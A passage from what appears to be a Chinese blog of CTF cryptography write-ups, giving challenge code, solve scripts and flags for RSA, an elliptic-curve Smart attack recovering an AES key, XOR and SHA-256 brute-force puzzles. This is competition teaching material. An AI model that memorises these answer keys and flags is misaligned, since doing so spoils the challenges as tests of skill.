class="number">10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801</span></span><br><span class="line">q_= <span class="number">24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369</span></span><br><span class="line">c= <span class="number">946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340</span></span><br><span class="line">n= <span class="number">1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843</span></span><br><span class="line">p = <span class="number">103250903193456504828487797156339600119426718627983781348818507950292820690249893916512022417900899107394861001239868070469917609264344248820063995415895904569850389089119540586899732656654237475843876867794510865961591835076374123380618390848608809256150058832564591055349379924805506351419667057604081135349</span></span><br><span class="line">q = <span class="number">157798635503839469752446717651986470734467411686145972950533703965287076311312462611586472586638209970353426866979322760898287139085723568538059792571420311212101255127104335382081281902858421593497990417294935915897371187857482102407324837122921138869143815707149289272669578185431882034384720823115075903787</span></span><br><span class="line">t = n // (p*q)</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(t-<span class="number">1</span>)</span><br><span class="line">u = gmpy2.gcd(e//<span class="number">6</span>,phi)</span><br><span class="line"><span class="built_in">print</span>(u)</span><br><span class="line">d = gmpy2.invert(e//<span class="number">6</span>,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">m = gmpy2.iroot(m,<span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment">#HECTF&#123;Congratulation!!you_find_flag&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="matrix"><a href="#matrix" class="headerlink" title="matrix"></a>matrix</h2><p>题目直接给出了flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;409bd7db0eb11a54e47eb5d0c9c371900eb11a54e47eb5d02e&#125;</span><br></pre></td></tr></table></figure>



<h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><h4 id="sage"><a href="#sage" class="headerlink" title="sage"></a>sage</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">235322474717419</span></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line">b=<span class="number">8856682</span></span><br><span class="line">k=</span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">P = E.random_point()</span><br><span class="line">P.order()==p</span><br><span class="line">Q=k*P</span><br><span class="line">aes_key=k</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P:&quot;</span>,P)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Q:&quot;</span>,Q)</span><br><span class="line"><span class="comment">#P=E(180571547161769,227820272156445)</span></span><br><span class="line"><span class="comment">#Q=E(76765539897460,69715189045993)</span></span><br></pre></td></tr></table></figure>

<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">aes_key = <span class="string">b&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(text) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        text += <span class="string">b&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(key) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        key += <span class="string">b&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">aes = AES.new(pad_key(aes_key), AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">plain_text = <span class="string">b&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line">enc_text = aes.encrypt(pad(plain_text))</span><br><span class="line">enc_text_b64=base64.b64encode(enc_text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc_text_b64)</span><br><span class="line">bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8=</span><br></pre></td></tr></table></figure>

<h3 id="sage脚本"><a href="#sage脚本" class="headerlink" title="sage脚本"></a>sage脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">235322474717419</span></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line">b=<span class="number">8856682</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">P=E(<span class="number">180571547161769</span>,<span class="number">227820272156445</span>)</span><br><span class="line">Q=E(<span class="number">76765539897460</span>,<span class="number">69715189045993</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P,Q,p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"> </span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"> </span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"> </span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"> </span><br><span class="line">r = SmartAttack(P, Q, p)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="comment">#152675955744921</span></span><br><span class="line">key=<span class="string">b&#x27;152675955744921&#x27;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(text) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        text += <span class="string">b&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(key) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        key += <span class="string">b&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"> </span><br><span class="line">aes = AES.new(pad_key(key), AES.MODE_ECB)</span><br><span class="line">c=<span class="string">&#x27;bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8=&#x27;</span></span><br><span class="line">c0=base64.b64decode(c)</span><br><span class="line"><span class="built_in">print</span>(c0)</span><br><span class="line">flag=aes.decrypt(c0)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#HECTF&#123;N0w_you_know_ecc_and_AES!&#125;</span></span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HECTF/" rel="tag">HECTF</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-2022天权信安-catf1ag"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/03/14/2022%E5%A4%A9%E6%9D%83%E4%BF%A1%E5%AE%89-catf1ag/"
    >2022天权信安&amp;catf1ag</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/03/14/2022%E5%A4%A9%E6%9D%83%E4%BF%A1%E5%AE%89-catf1ag/" class="article-date">
  <time datetime="2023-03-14T11:31:22.000Z" itemprop="datePublished">2023-03-14</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="2022天权信安-amp-catf1ag"><a href="#2022天权信安-amp-catf1ag" class="headerlink" title="2022天权信安&amp;catf1ag"></a>2022天权信安&amp;catf1ag</h1><h2 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># from Crypto.Util.number import *</span><br><span class="line"># from flag import flag</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># def nextPrime(n):</span><br><span class="line">#     n += 2 if n &amp; 1 else 1</span><br><span class="line">#     while not isPrime(n):</span><br><span class="line">#         n += 2</span><br><span class="line">#     return n</span><br><span class="line">#</span><br><span class="line"># p = getPrime(1024)</span><br><span class="line"># q = nextPrime(p)</span><br><span class="line"># n = p * q</span><br><span class="line"># e = 0x10001</span><br><span class="line"># d = inverse(e, (p-1) * (q-1))</span><br><span class="line"># c = pow(bytes_to_long(flag.encode()), e, n)</span><br><span class="line"></span><br><span class="line">#d= 12344766091434434733173074189627377553017680360356962089159282442350343171988536143126785315325155784049041041740294461592715296364871912847202681353107182427067350160760722505537695351060872358780516757652343767211907987297081728669843916949983336698385141593880433674937737932158161117039734886760063825649623992179585362400642056715249145349214196969590250787495038347519927017407204272334005860911299915001920451629055970214564924913446260348649062607855669069184216149660211811217616624622378241195643396616228441026080441013816066477785035557421235574948446455413760957154157952685181318232685147981777529010093</span><br><span class="line">#c= 11665709552346194520404644475693304343544277312139717618599619856028953672850971126750357095315011211770308088484683204061365343120233905810281045824420833988717463919084545209896116273241788366262798828075566212041893949256528106615605492953529332060374278942243879658004499423676775019309335825331748319484916607746676069594715000075912334306124627379144493327297854542488373589404460931325101587726363963663368593838684601095345900109519178235587636259017532403848656471367893974805399463278536349688131608183835495334912159111202418065161491440462011639125641718883550113983387585871212805400726591849356527011578</span><br><span class="line">#n= 13717871972706962868710917190864395318380380788726354755874864666298971471295805029284299459288616488109296891203921497014120460143184810218680538647923519587681857800257311678203773339140281665350877914208278709865995451845445601706352659259559793431372688075659019308448963678380545045143583181131530985665822655263963917413080872997526445384954610888776917323156325542921415838122754036103689148810677276471252057077595104724365967333418002158480223657363936976281758713027828747277980907153645847605403914070601944617432177385048803228970693240587900504431163155958465431312258451026447435473865563581029300541109</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d= <span class="number">12344766091434434733173074189627377553017680360356962089159282442350343171988536143126785315325155784049041041740294461592715296364871912847202681353107182427067350160760722505537695351060872358780516757652343767211907987297081728669843916949983336698385141593880433674937737932158161117039734886760063825649623992179585362400642056715249145349214196969590250787495038347519927017407204272334005860911299915001920451629055970214564924913446260348649062607855669069184216149660211811217616624622378241195643396616228441026080441013816066477785035557421235574948446455413760957154157952685181318232685147981777529010093</span></span><br><span class="line">c= <span class="number">11665709552346194520404644475693304343544277312139717618599619856028953672850971126750357095315011211770308088484683204061365343120233905810281045824420833988717463919084545209896116273241788366262798828075566212041893949256528106615605492953529332060374278942243879658004499423676775019309335825331748319484916607746676069594715000075912334306124627379144493327297854542488373589404460931325101587726363963663368593838684601095345900109519178235587636259017532403848656471367893974805399463278536349688131608183835495334912159111202418065161491440462011639125641718883550113983387585871212805400726591849356527011578</span></span><br><span class="line">n= <span class="number">13717871972706962868710917190864395318380380788726354755874864666298971471295805029284299459288616488109296891203921497014120460143184810218680538647923519587681857800257311678203773339140281665350877914208278709865995451845445601706352659259559793431372688075659019308448963678380545045143583181131530985665822655263963917413080872997526445384954610888776917323156325542921415838122754036103689148810677276471252057077595104724365967333418002158480223657363936976281758713027828747277980907153645847605403914070601944617432177385048803228970693240587900504431163155958465431312258451026447435473865563581029300541109</span></span><br><span class="line"></span><br><span class="line">p = gmpy2.next_prime(gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">q = n // p</span><br><span class="line"><span class="comment"># d1 = gmpy2</span></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;3895dfda-67b1-11ed-b784-b07b2568d266&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目介绍：我好&quot;疑惑&quot;啊</span><br><span class="line">keys1 = welcome_to_nine-ak_match_is_so_easy_!@!</span><br><span class="line">keys2 = 20 4 24 5 94 12 2 36 26 6 49 11 68 15 14 114 12 10 43 14 9 43 10 27 31 31 22 45 10 48 58 4 18 10 38 31 14 97 92</span><br></pre></td></tr></table></figure>

<h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">keys1 = <span class="string">&#x27;welcome_to_nine-ak_match_is_so_easy_!@!&#x27;</span></span><br><span class="line">keys2 = <span class="string">&#x27;20 4 24 5 94 12 2 36 26 6 49 11 68 15 14 114 12 10 43 14 9 43 10 27 31 31 22 45 10 48 58 4 18 10 38 31 14 97 92&#x27;</span></span><br><span class="line">keys2 = keys2.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(keys1[i])^<span class="built_in">int</span>(keys2[i])),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># catf1ag&#123;nine-ak_match_is@very_easy_@/!&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">题目描述：</span><br><span class="line">	小cat是某公司的安全侦察人员，在2022年9月9日凌晨6点，</span><br><span class="line">	小cat抓取到了几条疑似a人员和b人员交流的包，</span><br><span class="line">	经过破译，大致意思是“在今年xx月xx日xx点xx分准时进行数据交易”，</span><br><span class="line">	但是唯独不能完全破解出来，于是他发到公司的网络安全群寻求帮助：</span><br><span class="line">	69d00d9bc39e01687abf84e98e27c889cf1442b53edba27d3235acbeb7b0ae95</span><br><span class="line">	（密文格式是：年份必须是4位数，月日时分必须是两位数，需要用0补齐，比如2022年01月01日01时01分）</span><br></pre></td></tr></table></figure>

<h3 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">&#x27;69d00d9bc39e01687abf84e98e27c889cf1442b53edba27d3235acbeb7b0ae95&#x27;</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">13</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">61</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(i)) ==<span class="number">1</span>:</span><br><span class="line">                    i = <span class="string">&#x27;0&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(j)) ==<span class="number">1</span>:</span><br><span class="line">                    j = <span class="string">&#x27;0&#x27;</span>+<span class="built_in">str</span>(j)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(k)) == <span class="number">1</span>:</span><br><span class="line">                    k = <span class="string">&#x27;0&#x27;</span>+<span class="built_in">str</span>(k)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(m)) == <span class="number">1</span>:</span><br><span class="line">                    m = <span class="string">&#x27;0&#x27;</span>+<span class="built_in">str</span>(m)</span><br><span class="line">                tmp = <span class="string">&#x27;2022&#x27;</span>+<span class="built_in">str</span>(i)+<span class="built_in">str</span>(j)+<span class="built_in">str</span>(k)+<span class="built_in">str</span>(m)</span><br><span class="line">                <span class="comment"># print(tmp)</span></span><br><span class="line">                md = hashlib.sha256()</span><br><span class="line">                md.update(tmp.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                <span class="keyword">if</span> md.hexdigest() == c:</span><br><span class="line">                    <span class="built_in">print</span>(tmp)</span><br><span class="line"><span class="comment">#catf1ag&#123;202211121750&#125;</span></span><br></pre></td></tr></table></figure>

<p>或者直接在CMD5利用会员解密</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2022%E5%A4%A9%E6%9D%83%E4%BF%A1%E5%AE%89-catf1ag/" rel="tag">2022天权信安&amp;catf1ag</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-2023黄河流域公安网络技能挑战赛"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/03/06/2023%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%85%AC%E5%AE%89%E7%BD%91%E7%BB%9C%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/"
    >2023黄河流域公安网络技能挑战赛</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/03/06/2023%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%85%AC%E5%AE%89%E7%BD%91%E7%BB%9C%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/" class="article-date">
  <time datetime="2023-03-06T15:34:28.000Z" itemprop="datePublished">2023-03-06</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>官方wp</p>
<p><a target="_blank" rel="noopener" href="https://rb61qxxiv7.feishu.cn/docs/doccnFcZA8xHDlJNUFQs4QEXqvg">https://rb61qxxiv7.feishu.cn/docs/doccnFcZA8xHDlJNUFQs4QEXqvg</a></p>
<p>当时由于比赛时有事就打了一个小时</p>
<h1 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(<span class="number">282422904082982258621075610259452215824075271484821245626055284049965141753838118483499225118037659155776469308266679236514939371151200503486860900710638249138056870980395564136760046944176702722154502092895865522544199762580857041717582699398798829888596539858995029585412945532785867079274113878154724845910389733183058666310229884356997245</span>)))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mu.Chen_is_the_most_handsome_boy_in_SDPC_and_he_don&#x27;t_have_girlfriend!!!!!!!By_the_way_here_is_your_flag&#123;705bc7ea-e9e1-4996-a28f-dd962a777170&#125;</span><br></pre></td></tr></table></figure>

<h1 id="My-enc"><a href="#My-enc" class="headerlink" title="My_enc"></a>My_enc</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Cyber_key</span>(<span class="params">LEN</span>):</span><br><span class="line">    Key = [[] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(row):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(LEN):</span><br><span class="line">            Key[x].append(random.randint(<span class="number">0</span>, <span class="number">2023</span>))</span><br><span class="line">    <span class="keyword">return</span> Key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Punk_enc</span>(<span class="params">Key, msg</span>):</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> Key:</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(l, msg):</span><br><span class="line">            s += (x * y) % P</span><br><span class="line">            s %= P</span><br><span class="line">        out.append(s)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 